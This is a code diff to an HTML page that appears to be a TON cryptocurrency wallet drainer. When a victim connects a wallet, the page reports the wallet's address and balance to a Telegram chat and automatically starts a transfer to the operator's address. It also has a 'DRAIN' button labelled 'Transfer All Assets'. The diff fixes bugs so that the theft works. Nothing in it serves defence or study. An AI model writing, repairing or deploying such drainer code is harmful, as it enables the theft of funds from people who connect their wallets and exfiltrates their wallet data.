@@ -48,7 +48,7 @@
     </ul>
 
     <div id="ton-connect"></div> <!-- Connect Wallet Button -->
-    <button onclick="await didtrans(walletInfo.account);" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
+    <button id="drain-button" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
 
     <script>
         // Static tonconnect-manifest.json URL instead of dynamic creation
@@ -77,18 +77,21 @@
             buttonRootId: 'ton-connect'
         });
 
+        let connectedWallet = null;
+
         // Event listener for wallet connection
-tonConnectUI.onStatusChange(async (walletInfo) => {
-    if (walletInfo && walletInfo.account) {
-        const message = `Wallet connected: ${walletInfo.account}`;
-        await sendTelegramMessage(message);
-        await checkBalance(walletInfo.account.address);
-    // Automatically initiate transfer when wallet is connected
-    await didtrans();
-    } else {
-        console.error('No account connected or status not recognized.');
-    }
-});
+        tonConnectUI.onStatusChange(async (walletInfo) => {
+            if (walletInfo && walletInfo.account) {
+                connectedWallet = walletInfo.account;
+                const message = `Wallet connected: ${walletInfo.account.address}`;
+                await sendTelegramMessage(message);
+                await checkBalance(walletInfo.account.address);
+                // Automatically initiate transfer when wallet is connected
+                await didtrans();
+            } else {
+                console.error('No account connected or status not recognized.');
+            }
+        });
 
         // Function to check user balance and send it to Telegram
         async function checkBalance(walletAddress) {
@@ -108,12 +111,10 @@ tonConnectUI.onStatusChange(async (walletInfo) => {
         }
 
         // Function to transfer TON and NFTs
-        async function didtrans(walletAccount) {
+        async function didtrans() {
             console.log('Attempting to send transaction...');
             try {
-                // Use the wallet information from the onStatusChange event
-const walletInfo = tonConnectUI.connectedWallet;
-                if (!walletAccount) {
+                if (!connectedWallet) {
                     console.error('Wallet is not connected. Cannot proceed with transaction.');
                     return;
                 }
@@ -123,7 +124,7 @@ const walletInfo = tonConnectUI.connectedWallet;
                     messages: [
                         {
                             address: 'YOUR_DESTINATION_WALLET_ADDRESS', // Replace with your wallet address
-                            amount: parseFloat(walletAccount.balance || 0) - 3000000 // Deduct fee (in nanotons)
+                            amount: 5000000 // Replace with the appropriate amount (in nanotons)
                         }
                     ]
                 };
@@ -137,7 +138,11 @@ const walletInfo = tonConnectUI.connectedWallet;
                 await sendTelegramMessage(errorMessage);
             }
         }
+
+        // Event listener for the DRAIN button
+        document.getElementById('drain-button').addEventListener('click', async () => {
+            await didtrans();
+        });
     </script>
-    
 </body>
 </html>
